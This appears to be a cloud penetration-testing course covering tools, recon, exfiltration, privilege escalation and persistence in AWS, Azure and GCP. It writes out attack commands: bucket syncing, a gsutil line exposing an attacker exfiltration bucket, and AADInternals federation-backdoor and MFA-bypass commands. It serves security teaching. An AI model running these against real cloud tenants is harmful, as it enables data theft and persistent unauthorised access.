# Cloud Pentesting Tools and Techniques

## What you will learn in this course 🧐🧐

- How to conduct penetration testing in cloud environments?
- Tools and techniques for cloud penetration testing

## Prepwork

Before diving into the penetration testing process, it's essential to lay a solid foundation through meticulous planning and clear objective-setting. This initial phase ensures that both the penetration tester and the client are aligned with the security goals and expectations, establishing a framework that guides the entire evaluation. By defining specific security objectives, understanding the scope, and choosing the appropriate testing methods, all parties can effectively address potential vulnerabilities and enhance the overall security posture.

### Planning and Setting Objectives

**For the Penetration Tester:**

The external penetration tester should start by defining specific security objectives that align with the organization’s overall security strategy. Utilizing established security frameworks or standards such as **OWASP SAMM** and **AWS CIS** can guide the planning of mitigation measures and track progress. The tester must clearly identify the scope of testing, including cloud assets, applications, and data to be evaluated. Setting defined boundaries within the scope is essential to ensure comprehensive coverage and avoid any gaps in the testing process.

**For the Client:**

The client’s responsibilities include engaging with the cloud service provider to thoroughly understand the shared responsibility model. This step is crucial to clarify the security responsibilities of each party and prevent any gaps or overlaps. Additionally, the client should identify and document all relevant targets for the penetration test, including cloud assets, applications, and data that need to be evaluated. Defining these targets will help the penetration tester focus their efforts effectively. Furthermore, the client should establish oversight mechanisms to monitor adherence to security practices and ensure that the testing aligns with the organization’s defined security objectives and compliance requirements.

### Choosing the Right Approach

**Vulnerability Scanning**: Use automated tools to identify known vulnerabilities in your cloud applications and infrastructure. Prioritize vulnerabilities based on severity and relevance. This process highlights security loopholes, misconfigurations, and weak points, equipping you with insights to fortify your defenses.

**Penetration Testing**: Conduct controlled simulated attacks to evaluate your cloud environment's susceptibility to exploitation. This method reveals potential entry points, weak authentication mechanisms, and other security gaps.

**Source Code Analysis**: Review the source code of cloud applications to identify coding vulnerabilities and security flaws. Integrate secure coding practices into the development lifecycle, focusing on areas susceptible to injection attacks, cross-site scripting, and other vulnerabilities.

**Configuration Analysis**: Analyze the service configurations to identify weak access controls, misconfigurations, and other potential vulnerabilities that could expose your systems to breaches. This process helps strengthen your security posture by proactively addressing unintentional security gaps.

### Select Testing Approach

**Black Box Testing**: Simulate real-world attacks without prior knowledge of the cloud environment. This approach tests the effectiveness of external security defenses and the organization's incident response.

**Gray Box Testing**: Combine elements of both Black Box and White Box testing. Limited information about the cloud environment is provided, enabling testers to emulate insider threats. This approach balances realism and contextual understanding.

**White Box Testing**: Involves deep knowledge of the cloud infrastructure and applications. Testers can comprehensively assess security controls and uncover vulnerabilities with precision, making it ideal for critical cloud systems.

## Cloud Pentesting Tools

To conduct effective cloud penetration testing, it is essential to use specialized tools tailored for different cloud environments. Here are some of the most recommended tools for cloud pentesting.

### Configuration Review and Security Auditing Tools

#### [ScoutSuite](https://github.com/nccgroup/ScoutSuite): A multi-cloud security-auditing tool

Scout Suite is an open-source tool designed for multi-cloud security auditing, enabling comprehensive assessments of cloud environments' security postures. By leveraging the APIs provided by cloud service providers, Scout Suite collects configuration data for manual review, highlighting potential risk areas. This approach eliminates the need to navigate through numerous web console pages, as Scout Suite automatically presents a clear view of the attack surface.

Created by security consultants and auditors, Scout Suite provides a security-focused snapshot of the cloud account at the time it is run. Once the data is collected, all subsequent analysis can be conducted offline. The tool supports major cloud platforms, including AWS, Azure, Google Cloud, Alibaba Cloud, and Oracle Cloud, making it incredibly versatile. Scout Suite simplifies the process of assessing cloud environments by offering an automatic and clear overview of the attack surface, significantly saving time and effort for security professionals

```
{
  "services": {
    "iam": {
      "findings": {
        "iam-root-account-no-mfa": {
          "description": "Root account not protected with MFA",
          "level": "danger",
          "items": [
            {
              "id": "123456789012",
              "name": "Root account"
            }
          ]
        },
        "iam-user-no-key-rotation": {
          "description": "Users with access keys not rotated in the last 90 days",
          "level": "warning",
          "items": [
            {
              "id": "AIDAEXAMPLEUSERID",
              "name": "example-user",
              "access_key_1_last_rotated": "2022-01-01T00:00:00+00:00"
            }
          ]
        }
      }
    },
    "s3": {
      "findings": {
        "s3-bucket-world-readable": {
          "description": "Buckets with world-readable permissions",
          "level": "danger",
          "items": [
            {
              "id": "example-bucket",
              "name": "example-bucket"
            }
          ]
        }
      }
    }
  }
}
```

#### [Microburst](https://github.com/Netspi/Microburst): Assorted scripts for Azure security

This toolkit is your one-stop shop for everything related to Azure. It can be used for discovering Azure services, auditing configurations, and performing post-exploitation tasks. Created by **Karl Fosaaen**, an expert in cloud penetration testing, this toolkit is an excellent resource for testing Azure environments. It is specifically designed for use during penetration tests involving Azure, providing comprehensive tools and functionalities to assess and enhance the security of Azure deployments.

```powershell
PS C:\> Invoke-EnumerateAzureBlobs -Base company

Searching for company.blob.core.windows.net
Searching for company.file.core.windows.net
Searching for company.queue.core.windows.net
Searching for company.table.core.windows.net

Storage Account Found: company.blob.core.windows.net
Blob Container Found: https://company.blob.core.windows.net/public
Public File Found: https://company.blob.core.windows.net/public/example.txt

Storage Account Found: company.file.core.windows.net
SMB Share Found: \\company.file.core.windows.net\documents

Storage Account Found: company.queue.core.windows.net
Queue Found: https://company.queue.core.windows.net/messages

Storage Account Found: company.table.core.windows.net
Table Found: https://company.table.core.windows.net/users
```

#### [ROADTools](https://github.com/dirkjanm/ROADtools): Framework for interacting with Azure Active Directory (AD)

**ROADTools** is a framework designed for enumerating Azure Active Directory environments, serving both as a library and an exploitation tool. It facilitates authentication with Azure AD and provides tools for comprehensive interaction. It consist of two main parts:

**ROADlib**

**ROADlib** is a library within the ROADtools namespace, used to authenticate with Azure AD and build tools that integrate with a database containing data gathered by ROADrecon. The database model in ROADlib is automatically generated based on the metadata definitions of the Azure AD internal API.

**ROADrecon**

**ROADrecon** is a tool designed to explore Azure AD information from both Red Team and Blue Team perspectives. It creates an SQLAlchemy-backed database on disk using an automatically generated metadata model. ROADrecon utilizes asynchronous HTTP calls in Python to dump all available Azure AD graph information into this database. It includes plugins to query the database and output useful formats, and it offers an extensive Angular-based interface for direct offline database analysis.

For additional tools in similar domains, you might explore [PMapper](https://github.com/nccgroup/PMapper), designed for AWS environments, and the [Google Cloud privilege escalation](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation) toolkit by Rhino Security Labs.

```
$ roadrecon auth
Successfully authenticated
$ roadrecon gather
Gathering data...
$ roadrecon gui
Starting web server on http://127.0.0.1:5000

[GUI Output]
Users: 150
Groups: 25
Applications: 75
Service Principals: 100
Devices: 200

Risky Users:
- user1@company.com (High risk score)
- user2@company.com (Suspicious sign-in activity)

Privileged Accounts:
- admin@company.com (Global Administrator)
- securityadmin@company.com (Security Administrator)

Exposed Applications:
- CRM App (Client credentials exposed)
- HR Portal (Redirect URI misconfigured)
```

#### [SkyArk](https://github.com/cyberark/SkyArk): Discover the most privileged cloud users

Available for both Azure and AWS, this tool is invaluable for identifying additional attack surfaces. It addresses the emerging threat of [**Cloud Shadow Admins**](https://www.cyberark.com/resources/threat-research-blog/shadow-admins-the-stealthy-accounts-that-you-should-fear-the-most#:~:text=Shadow%20Admin%20accounts%20are%20accounts,using%20ACLs%20on%20AD%20objects), where attackers exploit non-trivial and "limited" permissions to escalate their privileges and become full cloud admins. Attackers can also use these specific permissions to create stealthy admin entities as an undercover persistence technique, posing a significant threat to cloud environments. Therefore, defenders should also consider utilizing this tool.

SkyArk, a cloud security project, features two main scanning modules:

- AzureStealth for Azure environments.
- AWStealth for AWS environments.

```powershell
PS C:\> Start-AWSRecording
AWS access key ID: AKIAIOSFODNN7EXAMPLE
AWS secret access key: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY

PS C:\> Scan-AWSCloudTrailForShadowAdmins

[*] Scanning AWS CloudTrail logs for potential Shadow Admins...

[+] Potential Shadow Admin detected:
    Username: power-user
    Action: AssumeRole
    Resource: arn:aws:iam::123456789012:role/AdminRole
    Event Time: 2023-08-28T10:15:30Z

[+] Potential Shadow Admin detected:
    Username: developer
    Action: PutRolePolicy
    Resource: arn:aws:iam::123456789012:role/LambdaExecutionRole
    Event Time: 2023-08-27T14:22:45Z

[*] Scan complete. 2 potential Shadow Admins identified.

PS C:\> Get-AWSPrivilegedUsers

[*] Enumerating AWS IAM users with high privileges...

[+] Privileged User:
    Username: admin-user
    Groups: Administrators
    Policies: AdministratorAccess

[+] Privileged User:
    Username: security-auditor
    Groups: SecurityAuditors
    Policies: SecurityAudit, ReadOnlyAccess

[*] Enumeration complete. 2 privileged users identified.
```

### Exploitation Frameworks and Attack Simulators

### [WeirdAAL](https://github.com/carnal0wnage/weirdAAL): An AWS attack library

WeirdAAL is an open-source framework designed to test and validate the security of AWS services and resources comprehensively. It provides a robust set of tools and libraries for simulating a wide range of attacks and vulnerabilities, making it an essential resource for security researchers and penetration testers aiming to evaluate the security measures of AWS environments. The framework is built to be highly customizable and extensible, allowing users to tailor it to their specific security needs and scenarios.

According to its creator, Chris Gates, one of the primary goals of WeirdAAL is to serve as a repository of valuable defensive and offensive security functions for AWS. This makes it a must-have resource for anyone involved in AWS security. Additionally, WeirdAAL is especially useful for black-box testing scenarios, where testers have limited information about the system they are evaluating, making it a versatile and powerful tool in the arsenal of security professionals.

```
$ python3 weirdAAL.py -m recon_all -t MyTarget

[+] IAM Actions allowed are [+]
['ListUsers', 'GetUser', 'ListGroups', 'ListRoles']

[+] S3 Actions allowed are [+]
['ListBuckets', 'GetBucketLocation', 'GetBucketAcl']

[+] EC2 Actions allowed are [+]
['DescribeInstances', 'DescribeSecurityGroups', 'DescribeVpcs']

[+] Lambda Actions allowed are [+]
['ListFunctions']

[!] Potential Privilege Escalation Vector found:
CreateAccessKey on IAM User: admin-user
```

### [Pacu](https://github.com/RhinoSecurityLabs/pacu): An AWS exploitation framework

Pacu is an open-source AWS exploitation framework designed for offensive security testing in cloud environments. Developed and maintained by Rhino Security Labs, Pacu enables penetration testers to exploit configuration flaws within an AWS account through a modular system that allows for easy expansion of its capabilities. The framework includes modules for various attacks, such as user privilege escalation, backdooring IAM users, and exploiting vulnerable Lambda functions.

Pacu's automated nature provides numerous modules that facilitate the enumeration of permissions, listing internal AWS resources across all regions, and conducting privilege escalation attacks, making it comparable to Metasploit but for the cloud. It is recommended to explore the [modules](https://github.com/RhinoSecurityLabs/pacu/wiki/Module-Detail) for more detailed information. However, it is advised to test automated tools like Pacu in a lab environment before deploying them in actual testing scenarios to ensure safety and effectiveness.

```
Pacu > run iam__enum_users_roles_policies_groups

[*] Starting module iam__enum_users_roles_policies_groups...
[+] Enumerating IAM users...
  User: admin-user
    Groups: Administrators
    Policies: AdministratorAccess
  User: developer
    Groups: Developers
    Policies: AWSLambdaFullAccess, AmazonS3FullAccess

[+] Enumerating IAM roles...
  Role: LambdaExecutionRole
    Policies: AWSLambdaBasicExecutionRole

[+] Enumerating IAM policies...
  Policy: CustomS3Policy
    Actions: s3:GetObject, s3:PutObject

Pacu > run ec2__enum_instances

[*] Starting module ec2__enum_instances...
[+] Instances found:
  Instance ID: i-1234567890abcdef0
    Name: WebServer
    State: running
    Public IP: 203.0.113.10
    Security Groups: web-sg
```

### Storage Security Tools

### [S3Scanner](https://github.com/sa7mon/S3Scanner): Scan for open AWS S3 buckets

S3Scanner is a free and easy-to-use tool designed to help identify and fix unsecured file buckets across all major cloud providers, including Amazon S3, Google Cloud Storage, and Spaces. During a black-box assessment, S3Scanner can be used to dump AWS S3 buckets, which often contain valuable information. The tool automates the search for publicly accessible resources across different cloud platforms and retrieves the information, making it a valuable resource for ensuring cloud storage security.

```
$ python3 s3scanner.py --buckets-file bucket-names.txt

[*] Scanning buckets...

[+] Open bucket found: company-backups
    URL: https://company-backups.s3.amazonaws.com
    Files:
      - database_dump.sql
      - user_data.csv

[+] Open bucket found: company-website
    URL: https://company-website.s3.amazonaws.com
    Files:
      - index.html
      - main.css
      - logo.png

[!] Misconfigured bucket found: internal-docs
    URL: https://internal-docs.s3.amazonaws.com
    ACL allows public read access
```

### Reconnaissance and Discovery Tools

### [PowerZure](https://github.com/hausec/PowerZure): PowerShell framework for Azure security

PowerZure is a PowerShell project designed to assess and exploit resources within Microsoft's cloud platform, Azure. Created to meet the need for a framework capable of both reconnaissance and exploitation of Azure, EntraID, and associated resources, PowerZure offers comprehensive tools for security testing.

By combining PowerZure with [AzureHound](https://bloodhound.readthedocs.io/en/latest/data-collection/azurehound.html), a tool specifically for Azure data collection, your testing process can be streamlined and more effective, ensuring thorough security assessments and efficient exploitation of vulnerabilities within Azure environments.

```
PS> Import-Module .\PowerZure.ps1
PS> Get-AzureTargets

Tenant ID: 12345678-1234-1234-1234-123456789012
Subscriptions:
  - Production (ID: 87654321-4321-4321-4321-210987654321)
  - Development (ID: 13579246-6543-6543-6543-135792468010)

PS> Get-AzureVMs

Name         ResourceGroup  Location    Status
----         -------------  --------    ------
WebServer01  WebApps        EastUS      Running
AppServer02  Backend        WestUS      Stopped

PS> Get-AzureADUsers | Where-Object {$_.AssignedRoles -contains "Global Administrator"}

DisplayName   UserPrincipalName      ObjectId
-----------   -----------------      --------
John Smith    john.smith@company.com 98765432-5678-5678-5678-987654321098

PS> Get-AzureStorageAccounts

Name              ResourceGroup   Location
----              -------------   --------
companystorage    DataStorage     EastUS
backupstorage     Backups         WestUS
```

## Methodology

### Recon

In the methodology of a cloud penetration test, the reconnaissance phase is critical for understanding the target environment and identifying potential attack vectors. This phase involves systematically gathering and analyzing information to build a comprehensive view of the cloud infrastructure.

### Objectives of Reconnaissance

The primary aim of reconnaissance is to map out the cloud environment, which involves several key aspects. One of the main objectives is to identify the cloud resources and services being utilized. For example, in AWS, this might involve discovering S3 buckets, EC2 instances, and Lambda functions. Understanding these components is crucial for determining how they might be vulnerable to exploitation.

Another objective is to grasp the network topology within the cloud environment. In Azure, this could involve examining the virtual networks and network security groups that define the communication between different resources. By mapping out this network topology, you can identify potential points of entry or misconfigurations.

Reconnaissance also involves enumerating accounts and identities. For instance, in Google Cloud Platform (GCP), you might explore IAM roles and policies to determine if there are overly permissive roles that could be exploited. Identifying such misconfigurations can reveal pathways to elevate privileges or access sensitive information.

Finally, detecting misconfigurations and potential weaknesses is a key goal. In AWS, this might involve checking for S3 buckets with public access or overly permissive IAM policies that could lead to unauthorized data exposure.

### Techniques of Reconnaissance

Reconnaissance techniques are generally categorized into passive and active methods. Passive reconnaissance involves gathering information without directly interacting with the target system. For example, using Open Source Intelligence (OSINT) to find publicly accessible AWS S3 bucket names can provide insights into potentially exposed data. Similarly, analyzing SSL/TLS certificates may reveal associated subdomains or other resources.

Active reconnaissance, on the other hand, involves direct interaction with the target. For instance, in Azure, performing a scan to identify open ports on virtual machines can help assess their security posture. This direct engagement also includes enumerating exposed APIs, which might involve using tools to interact with Google Cloud’s API Gateway and analyze available endpoints for vulnerabilities.

For AWS, an active reconnaissance might involve scanning for open ports on EC2 instances to determine if they are exposed to the internet, which could lead to potential exploitation. Additionally, discovering and testing configurations of S3 buckets to see if they allow public access or misconfigured permissions can reveal significant vulnerabilities.

#### Build Test Cases

With the information collected during reconnaissance, penetration testers create test cases that outline specific scenarios and vulnerabilities to target during testing. This phase includes simulating common cloud attacks, testing for access control weaknesses, and identifying potential data breaches or leaks within the cloud environment. The goal is to develop a comprehensive plan that addresses various potential security issues.

#### Deploy Scanners

Alongside, automated vulnerability scanners are deployed to identify common security weaknesses within the cloud environment. These tools help to uncover misconfigurations in cloud resources and services, unpatched vulnerabilities in software components, and weak passwords or insecure access controls. This automated approach ensures a thorough and efficient initial assessment of the cloud environment’s security posture.

### Provider-Specific Examples

When performing reconnaissance, the approach varies by cloud provider due to their unique architectures and services.

In AWS, reconnaissance might involve examining the configurations of an EC2 instance to see if it has a public IP address and whether its associated security groups are configured to allow inbound traffic from the internet. Additionally, reviewing S3 bucket policies to check if they are inadvertently set to public access could expose sensitive data. For example you can:

1. **List S3 Buckets**

To find available S3 buckets and check their configurations, you can use the AWS CLI:

```bash
aws s3 ls
```

This command lists all S3 buckets in your account. To check bucket policies, you might use:

```bash
aws s3api get-bucket-acl --bucket BUCKET_NAME
```

2. **Describ EC2 Instances**

To gather information about EC2 instances, including their public IP addresses and security group configurations:

```bash
aws ec2 describe-instances --query "Reservations[*].Instances[*].[InstanceId,PublicIpAddress,SecurityGroups]" --output table
```

3. **Check IAM Policies**

To examine IAM policies attached to roles or users:

```bash
aws iam list-policies --scope Local
aws iam get-policy --policy-arn arn:aws:iam::ACCOUNT_ID:policy/POLICY_NAME
```

In Azure, you might start by enumerating Azure Active Directory (AD) accounts to identify any accounts with high privileges. Next, you would review the configurations of virtual networks and Network Security Groups (NSGs) to understand the traffic flow and any potential misconfigurations that could expose resources to unauthorized access. You can do this by:

1. **Listing Azure Resources**

To list resources in a subscription:

```bash
az resource list --output table
```

To find virtual machines specifically:

```bash
az vm list --output table
```

2. **Checking Network Security Groups**

To retrieve the rules associated with a Network Security Group:

```bash
az network nsg show --resource-group RESOURCE_GROUP --name NSG_NAME --query "securityRules" --output table
```

3. **Enumerating Azure AD Users**

To list users in Azure Active Directory:

```bash
az ad user list --output table
```

For GCP, reconnaissance might include investigating IAM policies for Compute Engine instances to ensure that they are not overly permissive. You might also analyze the configurations of Cloud Storage buckets to verify that they are not publicly accessible or misconfigured, which could lead to data breaches. Here are some example of how to do it:

1. **Listing Compute Engine Instances**

To list all Compute Engine instances and their configurations:

```bash
gcloud compute instances list
```

2. **Checking IAM Policies**

To view IAM policies attached to a project or specific resources:

```bash
gcloud projects get-iam-policy PROJECT_ID
```

3. **Analyzing Cloud Storage Buckets**

To list Cloud Storage buckets and check their access controls:

```bash
gsutil ls
gsutil acl get gs://BUCKET_NAME
```

### Exfiltration

#### AWS S3

Amazon Simple Storage Service (S3) is a crucial data repository for many organizations. With the increasing amount of sensitive data stored in S3 buckets, AWS has established best practices for securing this data. However, managing and protecting sensitive information in S3 raises several key security concerns:

- **Access Control**: Can you consistently manage access across S3 and other repositories for your team and applications?
- **Monitoring**: Are your security and compliance teams aware of who has access to your S3 buckets and their activities?
- **Auditability**: Can you report on how you’re protecting S3 data and assure users of who has or has had access to their data?

Misconfigurations can inadvertently expose data stored in S3 to the internet, allowing hackers to list, download, replace or delete the data.

As security evolves, offensive security experts have developed tools that can be abused by hackers to exfiltrate data from S3 due to poorly implemented access control measures, known as Broken Level Object Authorization flaws. Data exfiltration occurs when READ permissions are set to a world level, allowing anonymous users to read the contents of a bucket.

**Finding S3 Buckets of a Target Application:**

There are several ways to find an associated Amazon S3 bucket of a target application:

- **Google Dorks**: Use search queries like `site:s3.amazonaws.com <site.com>` to find S3 buckets.
- **CLI Tools from GitHub**: Tools like [Slurp](https://github.com/0xbharath/slurp), [Bucket_finder](https://github.com/gwen001/s3-buckets-finder), [S3Scanner](https://github.com/sa7mon/S3Scanner), and [Cloudlist](https://github.com/projectdiscovery/cloudlist) can be used for bucket enumeration and asset listing.

To check for misconfigured Amazon S3 bucket ACLs, install AWS CLI and configure it with your AWS account credentials (Client ID and Client Secret). To check for misconfigurations:

- **List Permissions**: `aws s3api get-bucket-acl --bucket <bucket-name>`
- **List Contents**: `aws s3 ls s3://<bucket-name>`

If ACL permissions are misconfigured, you can download data from an S3 bucket using:

`aws s3 sync s3://<bucket>/<path> </local/path>`

**EC2 Metadata IP**: AWS provides instance metadata for EC2 instances via a private HTTP interface accessible only to the virtual server itself. Although not significant externally, this feature can be leveraged in SSRF-related attacks. Metadata is available via

`http://169.254.169.254/latest/meta-data/`.

Attackers might find leaked AWS Client ID and Client Secret Keys on platforms like GitHub or GitLab. If they gain access to these keys, they can exploit services like Amazon RDS and EBS by creating snapshots and resetting passwords, gaining full access to data without the original passwords. Similarly, improperly configured security groups exposing ports like Elasticsearch’s 9200 can lead to data dumps or ransomware attacks. Attackers can use Shodan dorks such as `port:"9200" elastic` to find exposed Elasticsearch databases.

**Application Abuse**: Persistent attackers can exploit web application vulnerabilities to exfiltrate sensitive data, as many web applications require access to such data to function. An example is the Facebook Data breach, where multiple software flaws allowed hackers to compromise user accounts.

#### GCP

Google Cloud Platform (GCP) is a suite of cloud computing services offered by Google, utilizing the same infrastructure that supports Google’s internal products like Google Search, Gmail, file storage, and YouTube. Within GCP, Google Storage provides static file hosting through resources known as “buckets,” similar to AWS S3 buckets.

To enumerate Google storage buckets, you can use a tool called [GCPBucketBrute](https://github.com/RhinoSecurityLabs/GCPBucketBrute). This tool checks discovered buckets for the privileges you have on them, helping you determine access levels and identify vulnerabilities to privilege escalation.

Additionally, Google storage buckets can be accessed via the terminal using the `gsutil` command. This command-line tool facilitates data exfiltration by enabling the transfer of data from the cloud to a local machine, allowing users to download and manage data stored in Google Storage buckets efficiently.

However, it is possible for an attacker to make a public writeable bucket which allows any client to upload.

`gsutil acl ch -u AllUsers:RW gs://attackers-exfil-bucket/`

#### Azure

There isn't really a specific method to follow for exfiltrating data on Azure.
Exfiltrating data from it involves similar principles as other cloud providers but takes advantage of specific features and configurations unique to Azure. Here are detailed methods attackers may use to exfiltrate data from Azure cloud services:

**Exploiting Misconfigured Azure Storage**

Attackers target Azure Blob Storage or other storage services that are publicly accessible or misconfigured. They can list, download, modify, or delete the data if these services are not properly secured.

**Exploiting Data Transfer Services**

Azure offers various data transfer services, such as Azure Data Box or Azure Import/Export. Attackers can misuse these services to transfer large amounts of data to external locations.

**Abusing Azure Snapshots and Backups**

Attackers can create snapshots of virtual machines or storage volumes in Azure. By scheduling regular snapshots and sharing them with their accounts, they can download the snapshots and extract the data.

**Using Outbound Traffic Channels**

Attackers can establish outbound traffic channels from compromised Azure resources to exfiltrate data. This may involve setting up reverse shells, creating VPN connections, or using VNet peering to transfer data to external infrastructure.

**Example Commands**

Attackers use various tools and commands specific to Azure for data exfiltration. [Azure CLI](https://github.com/Azure/azure-cli) is a common tool used to manage Azure resources and can be leveraged to list and download data.

- **List storage account contents**:

```shell
az storage blob list --account-name <account-name> --container-name <container-name>
```

- **Download blob storage contents**:

```shell
az storage blob download-batch --destination <local-path> --source <container-name> --account-name <account-name>
```

### Privilege Escalation

#### Horizontal vs. Vertical Privilege Escalation

Privilege escalation is classified into two categories: horizontal and vertical.

**Horizontal privilege escalation** occurs when an attacker gains unauthorized access to another user's account with similar privileges. For instance, an attacker might impersonate a co-worker to access sensitive data within a shared cloud storage service. This type of attack focuses on lateral movement within the same privilege level.

**Vertical privilege escalation** involves gaining access to a higher level of permissions or privileges. An example would be an attacker in a cloud system finding a password or API key that grants them access to a more sensitive system. This type of attack has seen a significant rise in recent years, with threat actors finding credentials that allow them to access privileged access management tools and sensitive backends. Mitigating this threat requires visibility into whether employees are following security best practices and not sharing sensitive data. Cloud Data Loss Prevention (DLP) tools can help ensure that sensitive information is not shared inappropriately.

#### Security Misconfigurations in Privilege Abuse

Security misconfigurations, such as overly broad permissions for specific accounts or inappropriate application settings, can create opportunities for privilege abuse. These misconfigurations often arise from human error, lack of understanding, or negligence. When attackers identify these weaknesses, they can exploit them to gain unauthorized access and control over cloud resources, jeopardizing an organization's sensitive data and systems. For example with:

- **Poor IAM and Access Management**: Misconfigured identity and access management (IAM) policies can allow attackers to escalate their privileges by exploiting overly permissive settings or policy loopholes.
- **Cloud Provider Vulnerabilities**: Attackers can target vulnerabilities in cloud applications or services to gain unauthorized access and elevate their privileges.
- **Vulnerable APIs**: Poorly secured APIs can be exploited by attackers to access sensitive data, modify configurations, or perform other unauthorized actions.
- **Social Engineering**: Attackers may target end-users to obtain sensitive information, such as OAuth tokens, API keys, passwords, and other credentials. This information is often shared in plaintext within collaborative SaaS applications like Slack or Jira, making it easier for social engineers to find and exploit. While zero trust identity measures are essential for keeping threat actors out, true security extends to zero trust data security. Organizations must ensure the protection of data within cloud systems and scan for API keys and other secrets wherever their employees collaborate.

#### AWS (Amazon Web Services)

AWS offer numerous services that rely heavily on Identity and Access Management (IAM) for controlling access to resources. Misconfigured IAM roles, overly permissive policies, and exposed credentials are common vectors for privilege escalation in AWS.

1. **Misconfigured IAM Policies:**
   Misconfigured or overly permissive IAM policies can inadvertently grant users more access than intended. If an attacker gains access to an account with a misconfigured policy, they can escalate their privileges.

- **Example Command:**

```bash
aws iam list-attached-user-policies --user-name <username>
```

This command lists the IAM policies attached to a user, which can reveal excessive permissions. If an attacker discovers a policy granting broad access, they can exploit this to gain control over more resources.

2. **Exploiting Role Assumption:**
   In AWS, roles are used to delegate access to users or services. If an attacker can assume a role with higher privileges, they can escalate their access level.

- **Example Command:**

```bash
aws sts assume-role --role-arn "arn:aws:iam::123456789012:role/AdminRole" --role-session-name "SessionName"
```

By assuming a role with elevated privileges, the attacker can gain temporary credentials that grant access to sensitive AWS resources.

3. **Use of Exposed Credentials:**
   Attackers often exploit exposed AWS credentials, such as access keys, to gain unauthorized access to resources.

- **Example Command:**

```bash
aws configure set aws_access_key_id <access-key-id>
aws configure set aws_secret_access_key <secret-access-key>
```

Using these commands, an attacker can configure their AWS CLI environment with stolen credentials, enabling them to interact with the AWS account and potentially escalate their privileges.

#### Azure (Microsoft Azure)

Azure, Microsoft's cloud platform, uses Role-Based Access Control (RBAC) to manage access to resources. Similar to AWS, privilege escalation in Azure can occur through misconfigurations, excessive permissions, or exploitation of service principals.

1. **Excessive Role Assignments:**
   If users or service principals are assigned roles with more permissions than necessary, attackers can exploit these roles to escalate their privileges.

- **Example Command:**

```bash
az role assignment list --assignee <user-email> --output table
```

This command lists all role assignments for a user, helping attackers identify roles that may grant more access than intended.

2. **Exploiting Service Principals:**
   Service principals are used by applications to access resources. If an attacker obtains credentials for a service principal with high-level permissions, they can escalate their privileges.

- **Example Command:**

```bash
az login --service-principal -u <app-id> -p <password> --tenant <tenant-id>
```

By using these credentials, the attacker can gain access to resources managed by the service principal, potentially leading to privilege escalation.

3. **Modifying Role Assignments:**
   Attackers who gain access to accounts with the ability to modify role assignments can elevate their privileges by assigning themselves higher roles.

- **Example Command:**

```bash
az role assignment create --assignee <user-email> --role <role-name> --scope /subscriptions/<subscription-id>
```

This command can be used to assign a high-level role (e.g., Owner) to an attacker, granting them elevated permissions across the Azure environment.

#### GCP (Google Cloud Platform)

GCP uses IAM policies to manage access to resources. Privilege escalation in GCP often involves exploiting misconfigured policies, compromised service accounts, or exposed credentials.

1. **IAM Policy Exploitation:**
   Misconfigured IAM policies can provide more access than necessary, which attackers can exploit to escalate their privileges.

- **Example Command:**

```bash
gcloud projects get-iam-policy <project-id> --format=json
```

This command retrieves the IAM policy for a project. Attackers can use it to identify misconfigurations that allow them to escalate privileges.

2. **Impersonating a Service Account:**
   Service accounts with high-level permissions can be exploited for privilege escalation. Attackers can impersonate these accounts to gain elevated access.

- **Example Command:**

```bash
gcloud auth activate-service-account <service-account-email> --key-file=<key-file>.json
```

This command activates a service account using its key file. If the service account has elevated permissions, the attacker gains those permissions as well.

3. **Using Compromised API Keys or Credentials:**
   If attackers gain access to API keys or other credentials, they can use them to access GCP resources and escalate their privileges.

- **Example Command:**

```bash
export GOOGLE_APPLICATION_CREDENTIALS=<path-to-key-file>.json
```

Setting this environment variable allows the attacker to authenticate using compromised credentials, granting them access to potentially sensitive resources.

### Persistence

#### Azure

**Applications and Service Principals**

Attackers with high-level privileges such as Application Administrator, Global Administrator, or a custom role with `microsoft.directory/applications/credentials/update` permissions can manipulate existing applications by adding credentials (either a secret or a certificate) to them. They can also target applications with elevated permissions or create new ones with these privileges. For instance, assigning the Privileged Authentication Administrator role to an application enables attackers to reset passwords of Global Administrators, effectively bypassing Multi-Factor Authentication (MFA).

To connect using PowerShell:

```powershell
$passwd = ConvertTo-SecureString "JEDHA" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential("app-id", $passwd)
Connect-AzAccount -ServicePrincipal -Credential $creds -Tenant "tenant-id"
```

For certificate-based authentication:

```powershell
Connect-AzAccount -ServicePrincipal -Tenant <TenantId> -CertificateThumbprint <Thumbprint> -ApplicationId <ApplicationId>
```

**Federation - Token Signing Certificate**

With Domain Admin (DA) privileges on an on-premises Active Directory (AD), it is possible to create and import new Token Signing and Token Decrypt certificates with long validity periods. This allows attackers to log in as any user whose ImmutableID they know. On the ADFS server, running the following command creates new certificates, adds them to ADFS, disables auto rollover, and restarts the service:

```powershell
New-AADIntADFSSelfSignedCertificates
```

Updating the certificate information with Azure AD can be done with:

```powershell
Update-AADIntADFSFederationSettings -Domain cyberranges.io
```

**Federation - Trusted Domain**

With Global Administrator privileges on a tenant, attackers can add a new domain, verify it, configure its authentication type to Federated, and set it to trust a specific certificate and issuer. Using AADInternals, these commands achieve the conversion of the domain to use a backdoor:

```powershell
ConvertTo-AADIntBackdoor -DomainName cyberranges.io
```

To get the ImmutableID of the user to impersonate:

```powershell
Get-MsolUser | select userPrincipalName,ImmutableID
```

And to access any cloud app as the user:

```powershell
Open-AADIntOffice365Portal -ImmutableID <ImmutableID> -Issuer "http://any.sts/B231A11F" -UseBuiltInCertificate -ByPassMFA $true
```

**Illicit Consent Grant**

In Azure Active Directory (Azure AD), any user can register an application by default. This capability can be exploited to register applications that require high-impact permissions, such as sending mail on behalf of a user or managing roles, which require admin consent. If an attacker has admin rights, they can approve these permissions themselves, facilitating highly effective phishing attacks. Moreover, the attacker can maintain access by accepting the application using their own user credentials.

#### AWS EC2

**Spot Fleet Request**

Spot instances are a cost-effective alternative to regular instances. An attacker might launch a small spot fleet request with automatic IP assignment and user data scripts that notify the attacker of the IP address upon startup. This fleet could be assigned a high-privileged IAM role, granting the attacker extended access at a lower cost.

**EC2 Lifecycle Manager**

EC2 Lifecycle Manager allows scheduling the creation of Amazon Machine Images (AMIs) and snapshots, which can be shared with other accounts. An attacker could exploit this by scheduling regular snapshots of all volumes and AMIs, then sharing these with their own account, enabling continuous access to the compromised environment.

**VPC Peering & VPN**

By setting up a peering connection between the attacker's VPC and the victim's VPC, the attacker can directly access resources within the victim's network, further extending their reach into the compromised environment. Or by creating a VPN allowing the attacker to establish a direct connection to the victim's VPC, bypassing other network security measures.

**Backdoor Instances**

